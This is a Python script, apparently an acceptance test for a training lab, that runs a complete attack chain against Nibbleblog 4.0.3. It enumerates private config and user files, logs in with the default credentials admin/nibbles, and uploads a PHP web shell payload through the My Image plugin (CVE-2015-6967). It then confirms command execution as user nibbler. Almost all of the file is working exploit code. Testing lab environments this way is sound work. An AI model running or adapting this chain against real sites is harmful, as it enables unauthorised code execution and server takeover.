#!/usr/bin/env python3
"""End-to-end original CMS HTTP test, using Python stdlib from a separate attacker."""
import http.cookiejar
import os
import urllib.parse
import urllib.request

BASE = os.environ.get("TARGET_URL", "http://nibbles-target")
client = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
def req(path, data=None, content_type=None):
    r = urllib.request.Request(BASE + path, data=data)
    if content_type:
        r.add_header("Content-Type", content_type)
    with client.open(r, timeout=10) as res:
        return res.status, res.read().decode("utf-8", errors="replace")

status, home = req("/")
assert status == 200 and "Hello world!" in home, "Initial root page missing"
assert "<!-- /nibbleblog/ -->" in home, "HTML source reconnaissance clue missing"
assert "my_image" not in home and "upload" not in home.lower(), "Do not reveal the exploit at the start"
status, readme = req("/nibbleblog/README")
assert status == 200 and "Version: v4.0.3" in readme, "Authentic version identification failed"
status, config = req("/nibbleblog/content/private/config.xml")
assert status == 200 and "Nibbles" in config, "Vendor config should be discoverable"
status, users = req("/nibbleblog/content/private/users.xml")
assert status == 200 and "admin" in users, "Username enumeration should work"
status, login = req("/nibbleblog/admin.php")
assert status == 200 and "Nibbleblog" in login, "Real CMS login missing"

status, dashboard = req("/nibbleblog/admin.php?controller=user&action=login",
    urllib.parse.urlencode({"username": "admin", "password": "nibbles"}).encode(),
    "application/x-www-form-urlencoded")
assert "Nibbleblog security error" not in dashboard, "Authentic login failed"
status, dashboard = req("/nibbleblog/admin.php?controller=dashboard&action=view")
assert "Nibbleblog security error" not in dashboard and status == 200, "Session not established"
status, install = req("/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image")
assert "Nibbleblog security error" not in install, "Original My Image install failed"

# Original admin/controllers/plugins/config.bit calls move_uploaded_file() on
# the uploaded file extension. No lab-specific backdoor is involved.
boundary = "----nibbles-local-acceptance-boundary"
payload = b'<?php echo "NIBBLES_REAL_UPLOAD_EXEC\n"; passthru("id"); ?>'
def part(name, val, filename=None, mime=None):
    head = f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\""
    if filename is not None:
        head += f"; filename=\"{filename}\""
    head += "\r\n"
    if mime:
        head += f"Content-Type: {mime}\r\n"
    return head.encode() + b"\r\n" + val + b"\r\n"

body = part("plugin", b"my_image") + part("image", payload, "proof.php", "application/octet-stream")
body += f"--{boundary}--\r\n".encode()
status, result = req("/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image",
    body, f"multipart/form-data; boundary={boundary}")
assert status == 200 and "Nibbleblog security error" not in result, "Native upload handler failed"
status, proof = req("/nibbleblog/content/private/plugins/my_image/image.php")
assert "NIBBLES_REAL_UPLOAD_EXEC" in proof and "uid=1001(nibbler)" in proof, (
    f"Expected genuine PHP execution under nibbler, got {proof[:500]!r}"
)
print("PASS: recon -> authentic Nibbleblog 4.0.3 -> native CVE-2015-6967 upload -> user nibbler")
